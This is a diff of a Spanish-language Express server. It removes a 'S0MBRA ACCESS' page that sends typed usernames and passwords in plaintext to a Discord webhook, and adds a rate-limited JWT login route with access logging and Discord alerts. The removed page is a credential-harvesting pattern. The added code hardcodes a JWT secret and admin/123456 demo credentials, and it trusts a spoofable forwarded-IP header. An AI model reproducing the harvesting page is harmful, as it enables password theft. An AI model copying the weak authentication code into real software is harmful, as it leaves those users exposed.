@@ -1,253 +1,159 @@
-import express from "express";
+const express = require('express');
+const jwt = require('jwt-simple');
+const cookieParser = require('cookie-parser');
+const axios = require('axios');
+const fs = require('fs');
+const path = require('path');
 
 const app = express();
-
 app.use(express.json());
+app.use(cookieParser());
 
-const PORT = process.env.PORT || 3000;
-const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK;
+// Trust Proxy para obtener la IP real si estás detrás de un proxy (Nginx, Cloudflare, Heroku)
+app.set('trust proxy', true);
 
-app.get("/", (req, res) => {
-  res.send(`
-<!DOCTYPE html>
-<html lang="es">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>S0MBRA ACCESS</title>
+// Configuración
+const SECRET_KEY = 'tu_clave_secreta_jwt';
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/TU_WEBHOOK_AQUI';
+const MAX_ATTEMPTS = 5;
+const LOCK_TIME_MS = 15 * 60 * 1000; // 15 minutos de bloqueo
 
-<style>
-* {
-  box-sizing: border-box;
+// Almacenamiento en memoria para contador de intentos y bloqueos temporales
+const loginAttempts = new Map();
+
+// 🌐 Función para sanitizar/obtener IP del cliente con precauciones
+function getClientIp(req) {
+    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
+    return ip.split(',')[0].trim();
 }
 
-body {
-  margin: 0;
-  min-height: 100vh;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  background: #080808;
-  color: white;
-  font-family: Arial, sans-serif;
+// 📋 Registro local de accesos en archivo
+function logAccessLocal(entry) {
+    const logLine = `[${entry.timestamp}] Usuario:${entry.username} | Status: ${entry.success ? 'ÉXITO' : 'FALLO'} \vert{} IP: ${entry.ip} | Intentos: ${entry.attempts} \vert{} User-Agent:${entry.userAgent}\n`;
+    fs.appendFileSync(path.join(__dirname, 'access.log'), logLine, 'utf8');
 }
 
-.container {
-  width: 90%;
-  max-width: 390px;
-  padding: 30px;
-  background: #111;
-  border: 1px solid #292929;
-  border-radius: 18px;
-  text-align: center;
-  box-shadow: 0 0 30px rgba(255,255,255,0.05);
+// 🔔 Envío de alertas a Discord
+async function sendDiscordNotification(data) {
+    if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes('TU_WEBHOOK_AQUI')) return;
+
+    const embed = {
+        title: data.success ? '✅ Inicio de sesión exitoso' : '❌ Intento de sesión fallido',
+        color: data.success ? 0x2ecc71 : 0xe74c3c,
+        fields: [
+            { name: '🟢 Usuario', value: `\`${data.username}\``, inline: true },
+            { name: '🕐 Fecha y Hora', value: data.timestamp, inline: true },
+            { name: '🌐 IP', value: `\`${data.ip}\``, inline: true },
+            { name: '📊 Intentos registrados', value: `${data.attempts}`, inline: true },
+            { name: '🔒 Estado Bloqueo', value: data.isLocked ? '⛔ Bloqueado' : '🟢 Activo', inline: true },
+            { name: '🖥️ User-Agent', value: `\`\`\`${data.userAgent.substring(0, 150)}\`\`\`` }
+        ],
+        timestamp: new Date().toISOString()
+    };
+
+    try {
+        await axios.post(DISCORD_WEBHOOK_URL, { embeds: [embed] });
+    } catch (err) {
+        console.error('Error al enviar webhook a Discord:', err.message);
+    }
 }
 
-.logo {
-  font-size: 32px;
-  font-weight: bold;
-  letter-spacing: 5px;
-  margin-bottom: 25px;
-}
+// Ruta de Autenticación
+app.post('/login', async (req, res) => {
+    const { username, password } = req.body;
+    const clientIp = getClientIp(req);
+    const userAgent = req.headers['user-agent'] || 'Desconocido';
+    const now = Date.now();
+    const formattedDate = new Date().toLocaleString();
 
-.label {
-  display: block;
-  text-align: left;
-  margin: 12px 0 7px;
-  color: #aaa;
-  font-size: 14px;
-}
+    // Key para rastrear intentos (combinación de Usuario e IP para mayor precisión)
+    const attemptKey = `${username}_${clientIp}`;
+    let attemptData = loginAttempts.get(attemptKey) || { count: 0, lockUntil: 0 };
 
-input {
-  width: 100%;
-  padding: 14px;
-  border-radius: 10px;
-  border: 1px solid #333;
-  background: #080808;
-  color: white;
-  outline: none;
-  text-align: center;
-  font-size: 16px;
-}
-
-input:focus {
-  border-color: #777;
-}
-
-button {
-  width: 100%;
-  margin-top: 20px;
-  padding: 14px;
-  border: 0;
-  border-radius: 10px;
-  background: white;
-  color: black;
-  font-size: 16px;
-  font-weight: bold;
-  cursor: pointer;
-}
-
-#status {
-  margin-top: 18px;
-  min-height: 22px;
-  color: #aaa;
-}
-</style>
-</head>
-
-<body>
-
-<div class="container">
-
-  <div class="logo">S0MBRA</div>
-
-  <label class="label">USUARIO</label>
-
-  <input
-    id="usuario"
-    type="text"
-    placeholder="Ingresá tu usuario"
-    autocomplete="off"
-  >
-
-  <label class="label">CLAVE</label>
-
-  <input
-    id="clave"
-    type="text"
-    placeholder="Ingresá clave"
-    autocomplete="off"
-  >
-
-  <button onclick="access()">ENTRAR</button>
-
-  <div id="status"></div>
-
-</div>
-
-<script>
-async function access() {
-
-  const usuario = document.getElementById("usuario").value.trim();
-  const clave = document.getElementById("clave").value.trim();
-  const status = document.getElementById("status");
-
-  if (!usuario || !clave) {
-    status.textContent = "⚠️ Completá los dos campos";
-    return;
-  }
-
-  status.textContent = "⏳ Enviando...";
-
-  try {
-
-    const response = await fetch("/access", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        usuario: usuario,
-        clave: clave
-      })
-    });
-
-    const data = await response.json();
-
-    if (data.success) {
-
-      status.textContent =
-        "✅ Usuario: " + usuario +
-        " | CLAVE: " + clave;
-
-    } else {
-
-      status.textContent = "❌ " + data.message;
-
+    // 🔒 Verificación de bloqueo temporal
+    if (attemptData.lockUntil > now) {
+        const remainingMinutes = Math.ceil((attemptData.lockUntil - now) / 60000);
+        return res.status(429).json({
+            error: `Cuenta/IP bloqueada temporalmente. Intenta de nuevo en ${remainingMinutes} minuto(s).`
+        });
     }
 
-  } catch (error) {
+    // Validación de credenciales (Ejemplo estático para la demostración)
+    const isValidUser = (username === 'admin' && password === '123456');
 
-    status.textContent = "❌ Error de conexión";
+    if (!isValidUser) {
+        // 📊 Incrementar contador de intentos
+        attemptData.count += 1;
 
-  }
-}
-</script>
+        // 🔒 Aplicar bloqueo temporal si supera el límite
+        let isLocked = false;
+        if (attemptData.count >= MAX_ATTEMPTS) {
+            attemptData.lockUntil = now + LOCK_TIME_MS;
+            isLocked = true;
+        }
 
-</body>
-</html>
-  `);
+        loginAttempts.set(attemptKey, attemptData);
+
+        const logEntry = {
+            username: username || 'Anónimo',
+            timestamp: formattedDate,
+            success: false,
+            ip: clientIp,
+            attempts: attemptData.count,
+            isLocked: isLocked,
+            userAgent: userAgent
+        };
+
+        // 📋 Registro local y 🔔 Notificación
+        logAccessLocal(logEntry);
+        sendDiscordNotification(logEntry);
+
+        return res.status(401).json({
+            error: 'Credenciales inválidas',
+            intentosRestantes: Math.max(0, MAX_ATTEMPTS - attemptData.count)
+        });
+    }
+
+    // Resetear contador de intentos en caso de éxito
+    loginAttempts.delete(attemptKey);
+
+    // 🎫 Crear sesión mediante JWT / Cookie
+    const payload = {
+        username: username,
+        iat: Math.floor(now / 1000),
+        exp: Math.floor((now + 3600000) / 1000) // Expiración en 1 hora
+    };
+    
+    const token = jwt.encode(payload, SECRET_KEY);
+
+    // Guardar token en cookie HTTP-Only segura
+    res.cookie('authToken', token, {
+        httpOnly: true, // Protege contra XSS
+        secure: process.env.NODE_ENV === 'production', // Requiere HTTPS en producción
+        sameSite: 'strict', // Protege contra CSRF
+        maxAge: 3600000
+    });
+
+    const logEntry = {
+        username: username,
+        timestamp: formattedDate,
+        success: true,
+        ip: clientIp,
+        attempts: 1,
+        isLocked: false,
+        userAgent: userAgent
+    };
+
+    // 📋 Registro local y 🔔 Notificación
+    logAccessLocal(logEntry);
+    sendDiscordNotification(logEntry);
+
+    return res.status(200).json({
+        message: 'Autenticación exitosa',
+        token: token
+    });
 });
 
-app.post("/access", async (req, res) => {
-
-  try {
-
-    const usuario = String(req.body?.usuario || "").trim();
-    const clave = String(req.body?.clave || "").trim();
-
-    if (!usuario || !clave) {
-      return res.status(400).json({
-        success: false,
-        message: "Completá los dos campos"
-      });
-    }
-
-    if (!DISCORD_WEBHOOK) {
-      return res.status(500).json({
-        success: false,
-        message: "Webhook no configurado"
-      });
-    }
-
-    await fetch(DISCORD_WEBHOOK, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        username: "S0MBRA ACCESS",
-        embeds: [
-          {
-            title: "🔐 Nuevo registro de prueba",
-            fields: [
-              {
-                name: "👤 Usuario",
-                value: usuario
-              },
-              {
-                name: "🔑 CLAVE",
-                value: clave
-              },
-              {
-                name: "Estado",
-                value: "🟢 RECIBIDO"
-              }
-            ],
-            timestamp: new Date().toISOString()
-          }
-        ]
-      })
-    });
-
-    res.json({
-      success: true,
-      message: "Datos recibidos"
-    });
-
-  } catch (error) {
-
-    console.error(error);
-
-    res.status(500).json({
-      success: false,
-      message: "Error interno"
-    });
-
-  }
-
-});
-
-app.listen(PORT, "0.0.0.0", () => {
-  console.log(`S0MBRA Access funcionando en puerto ${PORT}`);
+app.listen(3000, () => {
+    console.log('Servidor ejecutándose en el puerto 3000');
 });
